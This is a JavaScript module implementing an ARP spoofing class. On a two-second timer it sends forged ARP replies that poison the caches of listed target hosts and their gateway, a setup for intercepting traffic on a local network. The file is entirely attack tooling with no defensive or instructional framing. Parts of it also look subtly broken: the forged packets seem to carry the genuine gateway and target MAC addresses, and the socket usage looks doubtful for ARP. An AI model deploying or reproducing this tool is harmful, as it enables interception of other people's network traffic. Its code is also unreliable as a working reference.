import raw from 'raw-socket';
import logger from '../utils/logger.js';
import { createARPPacket } from './packet.js';

class ARPSpoofer {
    constructor() {
        this.socket = raw.createSocket({ protocol: raw.Protocol.ARP });
        this.interval = null;
        this.targets = new Map();
    }

    addTarget(targetIP, gatewayIP, targetMAC, gatewayMAC) {
        this.targets.set(targetIP, { gatewayIP, targetMAC, gatewayMAC });
    }

    removeTarget(targetIP) {
        this.targets.delete(targetIP);
    }

    start() {
        if (this.interval) return;

        this.interval = setInterval(() => {
            for (const [targetIP, { gatewayIP, targetMAC, gatewayMAC }] of this.targets) {
                // Poison target
                const packet1 = createARPPacket(
                    gatewayMAC, gatewayIP,
                    targetMAC, targetIP,
                    2 // ARP reply
                );
                this.socket.send(packet1, 0, packet1.length, targetIP);

                // Poison gateway
                const packet2 = createARPPacket(
                    targetMAC, targetIP,
                    gatewayMAC, gatewayIP,
                    2 // ARP reply
                );
                this.socket.send(packet2, 0, packet2.length, gatewayIP);
            }
        }, 2000);
    }

    stop() {
        if (this.interval) {
            clearInterval(this.interval);
            this.interval = null;
        }
        this.socket.close();
    }
}

export default ARPSpoofer;